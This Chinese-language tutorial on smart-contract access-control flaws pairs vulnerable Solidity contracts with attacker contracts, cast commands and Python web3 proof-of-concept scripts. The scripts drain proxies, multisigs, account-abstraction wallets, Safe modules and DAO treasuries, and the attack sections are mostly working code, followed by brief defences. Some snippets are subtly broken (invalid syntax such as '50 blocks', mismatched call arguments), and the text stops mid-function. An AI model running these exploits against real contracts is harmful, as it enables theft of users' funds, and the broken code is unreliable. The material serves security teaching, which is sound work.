# 访问控制 (Access Control)

## 原理

合约未正确实现权限控制，导致未授权用户可以执行管理员功能、修改关键参数、提取资金等。

## 经典漏洞

### 1. tx.origin 误用

```solidity
// 漏洞：使用 tx.origin 而非 msg.sender
contract Vulnerable {
    address owner;
    
    function transfer(address to, uint amount) public {
        // 漏洞：tx.origin 可能是用户，msg.sender 是攻击合约
        require(tx.origin == owner, "Not owner");
        payable(to).transfer(amount);
    }
}

// 攻击合约
contract Attacker {
    Vulnerable target;
    
    constructor(address _target) {
        target = Vulnerable(_target);
    }
    
    function attack() public {
        // 如果 owner 调用了这个函数
        // tx.origin == owner，绕过检查
        target.transfer(attacker, balance);
    }
}
```

### 2. 缺失权限检查

```solidity
// 漏洞：关键函数没有权限检查
contract Vulnerable {
    address owner;
    
    function setOwner(address newOwner) public {
        // 漏洞：没有 require(msg.sender == owner)
        owner = newOwner;
    }
    
    function withdraw() public {
        // 漏洞：没有权限检查
        payable(owner).transfer(address(this).balance);
    }
}
```

### 3. 公共 mint

```solidity
// 漏洞：mint 函数公开
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function mint(address to, uint amount) public {
        // 漏洞：任何人都可以 mint
        balances[to] += amount;
    }
}
```

### 4. 初始化函数可重复调用

```solidity
// 漏洞：initialize 可重复调用
contract Vulnerable {
    address owner;
    bool initialized;
    
    function initialize() public {
        // 漏洞：没有检查 initialized
        owner = msg.sender;
        initialized = true;
    }
}

// 攻击者在部署后调用 initialize，成为 owner
```

### 5. delegatecall 滥用

```solidity
// 漏洞：delegatecall 保留 msg.sender
contract Vulnerable {
    address owner;
    
    function delegate(address impl, bytes memory data) public {
        // 漏洞：delegatecall 保留 msg.sender 和 msg.value
        (bool success, ) = impl.delegatecall(data);
        require(success);
    }
}

// 攻击者通过 delegate 调用 setOwner
```

## 攻击链

### 1. 识别权限漏洞

```bash
# 查看合约源码
# 1. 检查 owner/ admin 设置
# 2. 检查 modifier
# 3. 检查 require
# 4. 检查 tx.origin vs msg.sender
```

### 2. 利用漏洞

```bash
# 使用 cast
cast send $TARGET "setOwner(address)" $ATTACKER --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $TARGET "withdraw()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## 防护方法

### 1. 使用 modifier

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

function setOwner(address newOwner) public onlyOwner {
    owner = newOwner;
}
```

### 2. 使用 OpenZeppelin Ownable

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract MyContract is Ownable {
    function withdraw() public onlyOwner {
        // ...
    }
}
```

### 3. 使用 AccessControl

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    
    constructor() {
        _setupRole(ADMIN_ROLE, msg.sender);
    }
    
    function withdraw() public onlyRole(ADMIN_ROLE) {
        // ...
    }
}
```

### 4. 避免使用 tx.origin

```solidity
// 错误
require(tx.origin == owner);

// 正确
require(msg.sender == owner);
```

## 攻击变种

### 1. 角色提权

```solidity
// 漏洞合约：AccessControl 的 ADMIN_ROLE 授予逻辑存在缺陷
// 任何持有 DEFAULT_ADMIN_ROLE 的用户都能通过 grantRole 提升自己
import "@openzeppelin/contracts/access/AccessControl.sol";

contract VulnerableDAO is AccessControl {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");

    mapping(uint256 => bool) public executed;

    constructor() {
        // 部署者持有 DEFAULT_ADMIN_ROLE
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(PROPOSER_ROLE, msg.sender);
        _grantRole(EXECUTOR_ROLE, msg.sender);
    }

    // 漏洞：grantRole 没有额外的 onlyRole 保护
    // DEFAULT_ADMIN_ROLE 拥有所有角色的管理权
    // 攻击者只要获取 DEFAULT_ADMIN_ROLE，就能给自己任何角色
    function grantRole(bytes32 role, address account) public override {
        // 注意：OpenZeppelin v4 的 _checkRole 在 grantRole 内部
        // 但如果部署者将 DEFAULT_ADMIN_ROLE 错误授予了普通用户...
        super.grantRole(role, account);
    }
}

// --- 攻击合约 ---
contract RoleEscalationAttacker {
    VulnerableDAO public target;

    constructor(address _target) {
        target = VulnerableDAO(_target);
    }

    // 假设通过其他漏洞获得了 DEFAULT_ADMIN_ROLE
    // 或者项目方误将 DEFAULT_ADMIN_ROLE 授予了前端合约
    function escalate(address victim) public {
        // 给自己授予 EXECUTOR_ROLE
        bytes32 EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
        target.grantRole(EXECUTOR_ROLE, address(this));

        // 给自己授予 PROPOSER_ROLE
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        target.grantRole(PROPOSER_ROLE, address(this));

        // 现在可以提议并执行恶意交易
    }
}
```

**PoC (Python/web3.py)：**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))
attacker = w3.eth.account.from_key("0xATTACKER_PRIVATE_KEY")
target_addr = "0xTargetContractAddr"

# 1. 枚举所有角色
roles_to_check = [
    "DEFAULT_ADMIN_ROLE",
    "ADMIN_ROLE",
    "PROPOSER_ROLE",
    "EXECUTOR_ROLE",
    "MINTER_ROLE",
    "PAUSER_ROLE",
]
for role_name in roles_to_check:
    role_hash = w3.keccak(text=role_name)
    has_role = contract.functions.hasRole(role_hash, attacker.address).call()
    print(f"[{'X' if has_role else ' '}] {role_name} -> 0x{role_hash.hex()}")

# 2. 如果持有 DEFAULT_ADMIN_ROLE，直接给目标转 ADMIN
admin_hash = w3.keccak(text="DEFAULT_ADMIN_ROLE")
if contract.functions.hasRole(admin_hash, attacker.address).call():
    tx = contract.functions.grantRole(
        w3.keccak(text="ADMIN_ROLE"),
        attacker.address
    ).transact({"from": attacker.address})
    print(f"[+] Escalated to ADMIN_ROLE, tx: {tx.hex()}")
```

### 2. 多签钱包攻击

```solidity
// 漏洞：多签钱包签名验证逻辑缺陷
// 签名未绑定 nonce 或 chainId，导致签名可重放/伪造
pragma solidity ^0.8.20;

contract VulnerableMultisig {
    address[] public signers;
    uint256 public threshold;
    uint256 public nonce;

    // 已执行的交易 hash 存储
    mapping(bytes32 => bool) public executed;

    constructor(address[] memory _signers, uint256 _threshold) {
        signers = _signers;
        threshold = _threshold;
    }

    // 漏洞1：hashTx 没有包含 nonce
    // 漏洞2：签名验证顺序可被操控
    function execute(address to, uint256 value, bytes memory data, bytes[] memory sigs)
        public returns (bool)
    {
        bytes32 txHash = keccak256(abi.encodePacked(to, value, data));
        // 没有包含 nonce！同一交易可重放
        // 没有包含 chainId！跨链可重放

        require(!executed[txHash], "Already executed");
        require(sigs.length >= threshold, "Insufficient signatures");

        // 漏洞3：允许重复签名者
        address lastSigner = address(0);
        for (uint256 i = 0; i < sigs.length; i++) {
            address signer = recoverSigner(txHash, sigs[i]);
            require(isSigner(signer), "Invalid signer");
            // 漏洞：没有检查 signer != lastSigner（同一个人签多次）
            lastSigner = signer;
        }

        executed[txHash] = true;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Transfer failed");
        return true;
    }

    function recoverSigner(bytes32 hash, bytes memory sig)
        internal pure returns (address)
    {
        // 漏洞4：v 值没有修正
        bytes32 ethSignedHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
        );
        address signer = ecrecover(ethSignedHash, uint8(sig[64]), sig[0:32], sig[32:64]);
        require(signer != address(0), "Invalid signature");
        return signer;
    }

    function isSigner(address _signer) public view returns (bool) {
        for (uint256 i = 0; i < signers.length; i++) {
            if (signers[i] == _signer) return true;
        }
        return false;
    }
}
```

**PoC (Python/web3.py)：**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 假设 3/5 多签，攻击者控制了 2 个签名者
attacker_key = w3.eth.account.from_key("0xATTACKER_PRIVATE_KEY")
compromised_key2 = w3.eth.account.from_key("0xCOMPROMISED_KEY_2")

# 构造提取资金的交易
to = attacker_key.address
value = w3.to_wei(100, "ether")
data = b""
tx_hash = w3.keccak(
    w3.codec.encode(["address", "uint256", "bytes"], [to, value, data])
)

# 同一个私钥签两次（漏洞3：允许重复签名者）
sig1 = w3.eth.account.sign_hash(tx_hash, private_key=attacker_key.key)
sig2 = w3.eth.account.sign_hash(tx_hash, private_key=compromised_key2.key)

# 将两个签名打包
def pack_sig(s):
    return s.r.to_bytes(32, 'big') + s.s.to_bytes(32, 'big') + bytes([s.v])

sigs = [pack_sig(sig1), pack_sig(sig1)]  # 用 sig1 两次！

# 发送交易
tx = contract.functions.execute(
    to, value, data, sigs
).transact({"from": attacker_key.address})
print(f"[+] Exploited multisig, tx: {tx.hex()}")

# --- 重放攻击 ---
# 如果没有 nonce 保护，可以在不同时间重复提交相同交易
```

### 3. 代理合约攻击

```solidity
// 漏洞：可升级代理的 upgradeTo 没有访问控制
pragma solidity ^0.8.20;

// 逻辑合约
contract LogicV1 {
    address public owner;
    uint256 public value;

    function initialize(address _owner) public {
        owner = _owner;
    }

    function setValue(uint256 _value) public {
        value = _value;
    }
}

// 攻击者部署的恶意逻辑合约
contract MaliciousLogic {
    address public owner;
    uint256 public value;
    // 假设代理合约中有一个 secretVault 变量在 storage slot 0
    mapping(address => uint256) public balances;

    function initialize(address _owner) public {
        owner = _owner;
    }

    // 恶意函数：窃取代理合约中的所有 ETH
    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // 恶意函数：在代理上下文中读写任意 storage
    function readSlot(uint256 slot) public view returns (bytes32) {
        bytes32 result;
        assembly {
            result := sload(slot)
        }
        return result;
    }

    function writeSlot(uint256 slot, bytes32 value) public {
        assembly {
            sstore(slot, value)
        }
    }
}

// 简化的可升级代理（演示不安全的 upgrade）
contract VulnerableProxy {
    address public implementation;
    address public admin;

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    // 漏洞：upgradeTo 缺少 admin 检查
    function upgradeTo(address newImpl) public {
        // require(msg.sender == admin, "Not admin"); // ← 被注释掉了！
        implementation = newImpl;
    }

    fallback() external payable {
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success);
    }
}
```

**攻击流程 (Python)：**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 部署恶意逻辑合约
malicious_code = """..."""  # MaliciousLogic 编译后的 bytecode
malicious_tx = {
    "from": attacker.address,
    "data": malicious_bytecode,
    "gas": 3000000,
}
malicious_receipt = w3.eth.send_transaction(malicious_tx)
malicious_addr = malicious_receipt["contractAddress"]
print(f"[+] Malicious logic deployed at {malicious_addr}")

# 2. 调用 upgradeTo 指向恶意合约（无需任何权限！）
proxy = w3.eth.contract(address=proxy_addr, abi=proxy_abi)
tx = proxy.functions.upgradeTo(malicious_addr).transact({
    "from": attacker.address,
    "gas": 100000,
})
print(f"[+] Proxy upgraded to malicious implementation, tx: {tx.hex()}")

# 3. 通过代理调用恶意合约的函数
malicious = w3.eth.contract(address=proxy_addr, abi=malicious_abi)
tx = malicious.functions.withdrawAll().transact({
    "from": attacker.address,
    "gas": 100000,
})
print(f"[+] Drained proxy funds, tx: {tx.hex()}")
```

### 4. 元交易攻击

```solidity
// 漏洞：元交易中继者未验证签名或 nonce
pragma solidity ^0.8.20;

contract VulnerableMetaTx {
    mapping(address => uint256) public nonces;
    mapping(address => uint256) public balances;

    // 元交易：用户签名，中继者代为提交
    // 漏洞：没有验证签名的 chainId 和 nonce
    function executeMetaTransaction(
        address user,
        address to,
        uint256 value,
        bytes memory data,
        uint8 v, bytes32 r, bytes32 s
    ) public {
        // 构造 EIP-712 风格的 hash，但缺少关键字段
        bytes32 hash = keccak256(abi.encodePacked(to, value, data));
        // 缺少：nonce, chainId, 合约地址
        // 导致签名可重放！

        bytes32 ethSignedHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
        );
        address signer = ecrecover(ethSignedHash, v, r, s);
        require(signer == user, "Invalid signature");

        // 漏洞：nonce 没有递增
        // nonces[user]++;

        balances[to] += value;

        (bool success, ) = to.call{value: value}(data);
        require(success, "Meta tx failed");
    }
}
```

**PoC：中继者伪造元交易**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 攻击者监听 mempool 中的元交易，获取用户签名
# 由于签名只绑定 (to, value, data)，不绑定 nonce/chainId

# 1. 捕获用户的合法元交易
# 用户签名了一笔：transfer(0xBob, 1 ETH)
# 但这个签名可以被重放为：transfer(0xAttacker, 1 ETH)
# 因为 hash = keccak(to, value, data) 中的 to 虽然不同
# 但攻击者可以让用户先签一笔看起来无害的交易

# 2. 直接重放签名
legitimate_sig = {"v": 27, "r": "0x...", "s": "0x..."}

# 如果 hash 没有包含合约地址和 chainId，
# 那么在 fork 链/测试网上也可以重放
# 或者如果 hash 只是 keccak(to, value, data)
# 那么可以构造同一笔交易在不同 nonce 下重复执行

# 重放攻击
for i in range(5):
    tx = contract.functions.executeMetaTransaction(
        victim.address,
        attacker.address,  # 攻击者的地址
        w3.to_wei(1, "ether"),
        b"",
        legitimate_sig["v"],
        bytes.fromhex(legitimate_sig["r"][2:]),
        bytes.fromhex(legitimate_sig["s"][2:]),
    ).transact({"from": attacker.address, "gas": 200000})
    print(f"[+] Replayed meta-tx #{i+1}: {tx.hex()}")
```

### 5. 账户抽象攻击

```solidity
// 漏洞：ERC-4337 验证器逻辑缺陷
// 在 validateUserOp 中缺少对 paymasterData 的签名验证
pragma solidity ^0.8.20;

// 简化的 EntryPoint 接口
interface IEntryPoint {
    function handleOps(UserOperation[] calldata ops, address payable beneficiary) external;
}

struct UserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    uint256 callGasLimit;
    uint256 verificationGasLimit;
    uint256 preVerificationGas;
    uint256 maxFeePerGas;
    uint256 maxPriorityFeePerGas;
    bytes paymasterAndData;
    bytes signature;
}

// 漏洞合约：账户抽象 Account 合约
contract VulnerableAAAccount {
    address public owner;
    address public paymaster;
    bool public initialized;

    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    function validateUserOp(
        UserOperation calldata userOp,
        bytes32 /* userOpHash */,
        uint256 /* missingAccountFunds */
    ) external returns (uint256 validationData) {
        // 漏洞1：没有检查 msg.sender == entryPoint
        // 恶意合约可以伪造 entryPoint 调用

        // 漏洞2：owner 场景下没有验证签名
        if (userOp.signature.length > 0) {
            // 漏洞3：签名校验逻辑错误
            // 只检查了 signature.length > 0，没有实际验证
            return 0; // success
        }
        return 0;
    }

    // 漏洞4：任何人都可以调用 execute
    function execute(address dest, uint256 value, bytes calldata func) external {
        (bool success, ) = dest.call{value: value}(func);
        require(success);
    }
}

// Paymaster 合约漏洞
contract VulnerablePaymaster {
    mapping(address => bool) public sponsored;

    // 漏洞：paymaster 为任何人支付 gas，没有验证 UserOp 内容
    function validatePaymasterUserOp(
        UserOperation calldata userOp,
        bytes32 /* userOpHash */,
        uint256 /* maxCost */
    ) external returns (bytes memory context, uint256 validationData) {
        // 漏洞：没有签名验证，没有白名单
        // 任何人都可以使用这个 paymaster
        context = "";
        validationData = 0;
    }

    // 漏洞：postOp 没有检查调用者
    function postOp(
        uint8 /* mode */,
        bytes calldata /* context */,
        uint256 actualGasCost
    ) external {
        // 没有检查 msg.sender == entryPoint
        // 恶意者可以跳过 gas 收费
    }
}
```

**PoC：利用 Account Abstraction 绕过**
```python
from web3 import Web3
from eth_abi import encode

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 构造恶意 UserOperation
# 恶意 initCode：部署一个 validateUserOp 永远返回 0 的合约
init_code = malicious_aa_factory.address + encode(
    ["address", "address"],
    [malicious_aa_factory.address, attacker.address]
).hex()

user_op = {
    "sender": predicted_addr,
    "nonce": 0,
    "initCode": bytes.fromhex(init_code),
    "callData": encode(
        ["address", "uint256", "bytes"],
        [victim.address, w3.to_wei(10, "ether"), b""]
    ).hex(),
    "callGasLimit": 200000,
    "verificationGasLimit": 100000,
    "preVerificationGas": 50000,
    "maxFeePerGas": w3.to_gwei(50),
    "maxPriorityFeePerGas": w3.to_gwei(2),
    "paymasterAndData": paymaster.address.hex(),  # 使用漏洞 Paymaster
    "signature": "0x" + "00" * 65,  # 空签名，因为 validateUserOp 不检查
}

# 2. 通过 EntryPoint 提交
receipt = entry_point.functions.handleOps(
    [user_op],
    attacker.address  # beneficiary — gas 退款给攻击者
).transact({"from": attacker.address, "gas": 500000})

print(f"[+] UserOp executed, tx: {receipt.transactionHash.hex()}")
print(f"[+] Paymaster paid the gas, attacker got gas refund")
```

## 2024-2026 新技术点

### 1. ERC-4337 账户抽象绕过

```solidity
// 漏洞：Account 合约中 validateUserOp 的签名校验不完整
// 攻击者部署自定义 Account 合约，绕过签名校验逻辑
pragma solidity ^0.8.20;

interface IEntryPoint {
    function handleOps(UserOperation[] calldata ops, address payable beneficiary) external;
    function getNonce(address sender, uint192 key) external view returns (uint256);
}

struct UserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    uint256 callGasLimit;
    uint256 verificationGasLimit;
    uint256 preVerificationGas;
    uint256 maxFeePerGas;
    uint256 maxPriorityFeePerGas;
    bytes paymasterAndData;
    bytes signature;
}

// 漏洞合约：绕过签名校验的 Account
contract ExploitAccount {
    address public owner;
    bool public initialized;

    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    // 漏洞1：validateUserOp 对 userOpHash 的签名验证有缺陷
    function validateUserOp(
        UserOperation calldata userOp,
        bytes32 userOpHash,
        uint256 /* missingAccountFunds */
    ) external returns (uint256 validationData) {
        // 修复1 应该检查：require(msg.sender == entryPoint)
        // 修复2 应该验证签名：ecrecover(userOpHash, v, r, s) == owner

        // 漏洞：使用 ecrecover 但没有处理返回零地址的情况
        bytes32 ethSignedHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash)
        );
        address signer = ecrecover(
            ethSignedHash,
            uint8(userOp.signature[64]),
            bytes32(userOp.signature[0:32]),
            bytes32(userOp.signature[32:64])
        );

        // 漏洞：没有 require(signer == owner)
        // 只要 ecrecover 不返回零地址就通过
        // 攻击者可以用任意私钥签名（ecrecover 不会返回零地址的概率极高）
        if (signer != address(0)) {
            return 0; // validation passed
        }
        return 1; // validation failed — 但这几乎不会触发
    }

    // 攻击者通过 execute 提取资金
    function execute(address dest, uint256 value, bytes calldata func) external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = dest.call{value: value}(func);
        require(success);
    }
}

// 工厂合约漏洞：initCode 中的 initialize 调用可以被抢跑
contract AccountFactory {
    mapping(address => bool) public deployed;

    function createAccount(
        address owner,
        uint256 salt
    ) external returns (address) {
        address predicted = address(
            uint160(uint(keccak256(
                abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(type(ExploitAccount).creationCode))
            )))
        );

        if (!deployed[predicted]) {
            // 漏洞：在 CREATE2 之前，任何人可以抢先调用 initialize
            // 这是已知的初始化抢跑攻击（Diamond Pattern 也受影响）
            ExploitAccount acc = new ExploitAccount{salt: salt}();
            acc.initialize(owner);
            deployed[predicted] = true;
        }
        return predicted;
    }
}
```

**PoC：账户抽象签名校验绕过**
```python
from web3 import Web3
from eth_abi import encode
import os

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))
entry_point = w3.eth.contract(address=ENTRY_POINT_ADDR, abi=ENTRY_POINT_ABI)

# 1. 构造恶意 initCode — 部署 ExploitAccount
factory_addr = bytes.fromhex(ACCOUNT_FACTORY_ADDR[2:])
salt = 0
init_code = factory_addr + encode(
    ["address", "uint256"],
    [attacker.address, salt]
).hex().encode()

# 2. 使用随机私钥签名（ecrecover 不会返回零地址）
random_key = os.urandom(32)
random_sig = w3.eth.account.sign_hash(
    bytes.fromhex("00" * 32),  # 伪造的 userOpHash
    private_key=random_key
)

# 打包签名
sig = (random_sig.r.to_bytes(32, 'big') +
       random_sig.s.to_bytes(32, 'big') +
       bytes([random_sig.v]))

user_op = {
    "sender": predicted_addr,
    "nonce": 0,
    "initCode": init_code,
    "callData": encode(
        ["address", "uint256", "bytes"],
        [victim.address, w3.to_wei(50, "ether"), b""]
    ),
    "callGasLimit": 300000,
    "verificationGasLimit": 200000,
    "preVerificationGas": 50000,
    "maxFeePerGas": w3.to_gwei(100),
    "maxPriorityFeePerGas": w3.to_gwei(5),
    "paymasterAndData": "0x",
    "signature": "0x" + sig.hex(),
}

# 3. 提交 UserOp
receipt = entry_point.functions.handleOps(
    [user_op],
    attacker.address
).transact({"from": attacker.address, "gas": 800000})
print(f"[+] Account Abstraction bypass complete, tx: {receipt.transactionHash.hex()}")
```

### 2. 多签钱包漏洞

```solidity
// Gnosis Safe 1.x / 2.x 常见访问控制漏洞
// 漏洞类型：签名验证绕过、handler 操作、guard 绕过
pragma solidity ^0.8.20;

// ===== Gnosis Safe 签名重排序攻击 =====
// Safe 的 checkSignatures 不检查签名顺序
// 但某些集成合约错误地假设签名是有序的
contract SignatureOrderExploit {
    // 假设一个集成合约验证 Safe 的 owner 变更
    // 它期望签名按照 owner 地址排序
    // 但 Safe 的 checkSignatures 不保证顺序

    function exploitSignatureOrdering() external {
        // Safe 2.0+ 使用 checkSignatures(bytes memory signatures)
        // 签名格式: r || s || v 拼接，按 owner 索引排序
        // 但如果实现中没有检查索引和签名的对应关系...

        // 攻击：构造一个看起来合法的签名数组
        // 其中最后一个签名的 v 值被修改为 1 (v+27)
        // 在某些 ECDSA 实现中，v=1 和 v=28 是不同的恢复模式
    }
}

// ===== Safe Module 权限提升 =====
// Safe 的 Module 可以执行任意交易而无需多签批准
// 如果有不当的 Module 注册/注销逻辑...
contract SafeModuleExploit {
    // 漏洞场景：Module 允许 self-destruct
    // Module 调用 self-destruct 删除自身，然后重新部署
    // 新 Module 可以有任意逻辑

    // 正确做法：Module 应该实现 close() 方法而非 self-destruct
    // Safe 2.1.1+ 已经限制了 self-destruct
}

// ===== Safe Handler 访问控制 =====
// Safe 的 swapOwner / addOwner 通过 execTransactionFromModule 执行
// 如果 Module 没有正确验证目标合约...
contract HandlerExploit {
    // 攻击者部署一个 "看似合法" 的 Module
    // 该 Module 在 execTransactionFromModule 中
    // 通过 delegatecall 执行任意代码
    // 而 delegatecall 保留了 Safe 的 context

    // Safe 2.4+ 增加了 delegatecall 白名单检查
    // 但旧版本仍可能受影响
}

// ===== 攻击合约：利用 Module 提取资金 =====
contract MaliciousModule {
    address public safe;

    constructor(address _safe) {
        safe = _safe;
    }

    // 作为 Module 被 Safe 调用时
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 /* operation */
    ) external returns (bool success) {
        // 漏洞：没有验证 to 是否为白名单地址
        // Module 可以向任意地址发送资金
        (success, ) = to.call{value: value}(data);
        return success;
    }

    // Safe 通过 execTransactionFromModule 调用此函数
    // 而 execTransactionFromModule 只需要 1 个 owner 签名
    // 而非完整多签
    function drainFunds() external {
        // 利用 execTransactionFromModule 的低门槛
        // 1 个 owner 就能通过 Module 执行大额转账
        (bool success, ) = safe.call(
            abi.encodeWithSignature(
                "execTransactionFromModule(address,uint256,bytes,uint8)",
                msg.sender, // 攻击者
                address(safe).balance,
                "",
                0 // CALL
            )
        );
        require(success);
    }
}
```

**PoC：利用 Module 绕过多签**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 前提：攻击者已控制 Safe 的 1 个 owner（通过社工/私钥泄露）
# Safe 2/3 多签，攻击者控制 owner1

# 2. 注册恶意 Module（需要 1 个 owner 签名的 enableModule 调用）
malicious_module = deploy_contract("MaliciousModule", safe_addr)

# 通过 Safe 的 execTransaction 注册 Module
# 这只需要 1 个 owner 的 EOA 签名
enable_module_data = safe.encodeABI(
    fn_name="enableModule",
    args=[malicious_module.address]
)

# 3. 利用 Module 执行任意交易（绕过多签！）
# execTransactionFromModule 只需要 Module 被启用
tx = malicious_module.functions.drainFunds().transact({
    "from": attacker.address,
    "gas": 200000,
})
print(f"[+] Drained {w3.from_wei(w3.eth.get_balance(safe_addr), 'ether')} ETH via Module bypass")
```

### 3. DAO 治理攻击

```solidity
// DAO 治理攻击：闪电贷投票权操纵 + 提案劫持
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/governance/Governor.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorVotes.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorCountingSimple.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorTimelockControl.sol";

contract VulnerableDAO is Governor, GovernorVotes, GovernorCountingSimple, GovernorTimelockControl {
    constructor(IVotes _token, TimelockController _timelock)
        Governor("VulnerableDAO")
        GovernorVotes(_token)
        GovernorCountingSimple()
        GovernorTimelockControl(_timelock)
    {}

    // 漏洞1：投票权快照没有在提案创建时锁定
    // 使用的是当前区块的投票权而非快照
    function _countVote(
        uint256 proposalId,
        address account,
        uint8 support,
        bytes memory /* params */
    ) internal override {
        // 如果使用 getCurrentVotes() 而非 getPastVotes()
        // 闪电贷可以在同一区块获得投票权并投票
        // 注意：OpenZeppelin Governor 默认使用 getPastVotes
        // 但如果子类覆盖了这个行为...
    }

    // 漏洞2：proposalThreshold 为 0
    // 任何人可以创建提案
    function proposalThreshold() public view override returns (uint256) {
        return 0; // 应该要求最低持仓
    }

    // 漏洞3：votingPeriod 过短
    function votingPeriod() public pure override returns (uint256) {
        return 50 blocks; // 只有 ~10 分钟，来不及响应
    }

    function quorum(uint256 /* blockNumber */) public pure override returns (uint256) {
        return 1; // 几乎为零的 quorum
    }
}

// ===== 提案劫持合约 =====
contract ProposalHijack {
    VulnerableDAO public dao;
    TimelockController public timelock;

    constructor(address _dao, address _timelock) {
        dao = VulnerableDAO(_dao);
        timelock = TimelockController(_timelock);
    }

    // 攻击1：闪电贷投票操纵
    // 在同一个区块内：借入代币 → 创建提案 → 投票 → 还款
    function flashLoanGovernanceAttack(
        address flashLender,
        address governanceToken,
        address maliciousTarget
    ) external {
        // 1. 闪电贷获取大量治理代币
        uint256 loanAmount = 10_000e18; // 10,000 tokens
        bytes memory loanData = abi.encodeWithSignature(
            "flashLoan(uint256)", loanAmount
        );

        // 2. 在回调中：铸造投票代币 → 提案 → 投票
        // callback:
        //   IERC20(governanceToken).transferFrom(flashLender, address(this), loanAmount);
        //   IVotes(governanceToken).delegate(address(this));
        //   dao.propose([maliciousTarget], [0], [maliciousPayload], "Drain");
        //   dao.castVote(proposalId, 1); // FOR

        // 3. 还款（在同一个交易中）
    }

    // 攻击2：提案执行后恶意调用
    function executeMaliciousProposal(uint256 proposalId) external {
        // 通过 timelock 执行恶意提案
        // timelock.execute() 可以执行任意交易
        bytes memory payload = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            timelock.balance
        );
        timelock.execute(
            address(this),
            timelock.balance,
            payload,
            bytes32(0),
            bytes32(0),
            bytes32(0),
            uint256(0),
            new bytes[](0),
            new bytes[](0)
        );
    }
}
```

**PoC：闪电贷 DAO 治理攻击**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 目标：一个使用时间锁的 DAO
# 攻击步骤：闪电贷 → 治理投票 → 执行恶意提案

# 1. 部署攻击合约
attack_contract = deploy_contract("ProposalHijack", dao_addr, timelock_addr)

# 2. 一键执行闪电贷治理攻击
# 在单个交易中完成：借代币 → 投票 → 还款
tx = attack_contract.functions.flashLoanGovernanceAttack(
    aave_lending_pool,      # 闪电贷来源
    governance_token_addr,   # 治理代币
    malicious_target_addr    # 恶意提案的目标
).transact({
    "from": attacker.address,
    "gas": 500000,
    "value": w3.to_wei(0.1, "ether"),  # 手续费
})

# 3. 等待投票期结束 + timelock 延迟后执行
print(f"[+] Flash loan governance attack initiated, tx: {tx.hex()}")
print("[*] Waiting for voting period + timelock delay...")
print("[*] After delay, execute: dao.execute(proposalId)")

# --- 实际的恶意提案 payload ---
malicious_payload = w3.codec.encode(
    ["address", "bytes"],
    [
        treasury_addr,
        encode(["function transfer(address,uint256)"],
               [attacker.address, w3.to_wei(1000, "ether")])
    ]
)
```

### 4. Timelock 绕过

```solidity
// Timelock 绕过：利用时间锁合约的逻辑缺陷绕过延迟
pragma solidity ^0.8.20;

// ===== 常见 Timelock 漏洞模式 =====

// 漏洞1：使用 block.timestamp 作为唯一的时间锁检查
// 攻击者可以在同一区块内多次执行
contract VulnerableTimelock1 {
    uint256 public constant DELAY = 2 days;
    mapping(bytes32 => uint256) public queuedAt;
    mapping(bytes32 => bool) public executed;

    // 漏洞：没有检查 queuedAt[txHash] > 0
    // 如果直接调用 execute 而不经过 queue，delay 检查会失败
    // 但如果有另一条路径...

    function execute(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 txHash
    ) external {
        require(!executed[txHash], "Already executed");
        // 漏洞：如果 queuedAt[txHash] == 0
        // block.timestamp - 0 > DELAY 永远为真！
        require(
            block.timestamp - queuedAt[txHash] >= DELAY,
            "Timelock not expired"
        );
        executed[txHash] = true;
        (bool success, ) = target.call{value: value}(data);
        require(success);
    }
}

// 漏洞2：remove 操作不验证 delay
contract VulnerableTimelock2 {
    uint256 public constant DELAY = 7 days;
    uint256 public constant GRACE_PERIOD = 14 days;
    mapping(bytes32 => uint256) public queued;

    function queue(address target, uint256 value, bytes calldata data) external {
        bytes32 txHash = keccak256(abi.encode(target, value, data));
        queued[txHash] = block.timestamp + DELAY;
    }

    // 漏洞：没有 DELAY 检查，可以在 queue 后立即 cancel
    // 这本身不算漏洞，但如果 cancel 和 execute 之间存在 race condition...
    function cancel(address target, uint256 value, bytes calldata data) external {
